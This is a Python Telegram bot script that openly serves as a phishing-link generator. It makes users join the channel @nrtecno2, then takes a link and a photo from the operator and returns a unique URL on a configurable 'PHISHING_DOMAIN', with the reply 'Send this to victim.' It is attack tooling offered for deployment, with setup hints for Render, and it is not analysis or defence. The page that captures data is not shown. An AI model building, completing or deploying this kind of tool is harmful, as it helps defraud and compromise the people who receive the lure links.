import os
import sqlite3
import hashlib
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
PHISHING_DOMAIN = os.environ.get('PHISHING_DOMAIN', 'https://your-server.onrender.com')
CHANNEL_USERNAME = '@nrtecno2'

# ========== DATABASE ==========
conn = sqlite3.connect('shared/database.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, username TEXT, link TEXT, photo_id TEXT, unique_code TEXT)''')
conn.commit()

# ========== FUNCTIONS ==========
def check_subscription(context, user_id):
    try:
        member = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def generate_unique_link(user_id):
    raw = f"{user_id}_{time.time()}"
    return hashlib.md5(raw.encode()).hexdigest()[:10]

# ========== HANDLERS ==========
def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    is_subscribed = check_subscription(context, user_id)
    
    if not is_subscribed:
        keyboard = [[
            InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"),
            InlineKeyboardButton("✅ Verify", callback_data="verify_sub")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text(
            "⚠️ *Access Denied!*\n\nYou must join @nrtecno2 first.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        update.message.reply_text("✅ *Verified!*\n\nSend me the **link** you want to share.", parse_mode="Markdown")
        c.execute("INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
                  (user_id, update.effective_user.username or 'Unknown'))
        conn.commit()

def verify(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    is_subscribed = check_subscription(context, user_id)
    
    if is_subscribed:
        query.edit_message_text("✅ *Verified!*\n\nNow send me the **link** you want to share.", parse_mode="Markdown")
        c.execute("INSERT OR REPLACE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
    else:
        query.answer("❌ You haven't joined yet!", show_alert=True)

def handle_link(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    link = update.message.text
    c.execute("UPDATE users SET link = ? WHERE user_id = ?", (link, user_id))
    conn.commit()
    update.message.reply_text("📸 *Photo Required!*\n\nNow send a **photo** to show victim.", parse_mode="Markdown")

def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    photo_id = update.message.photo[-1].file_id
    unique_code = generate_unique_link(user_id)
    
    c.execute("UPDATE users SET photo_id = ?, unique_code = ? WHERE user_id = ?",
              (photo_id, unique_code, user_id))
    conn.commit()
    
    phishing_link = f"{PHISHING_DOMAIN}/{unique_code}"
    update.message.reply_text(
        f"✅ *Link Generated!*\n\n🔗 `{phishing_link}`\n\nSend this to victim.",
        parse_mode="Markdown"
    )

def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set! Add environment variable in Render.")
        return
    
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(verify, pattern="verify_sub"))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_link))
    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
    
    updater.start_polling()
    print("✅ Bot is running!")
    updater.idle()

if __name__ == '__main__':
    main()
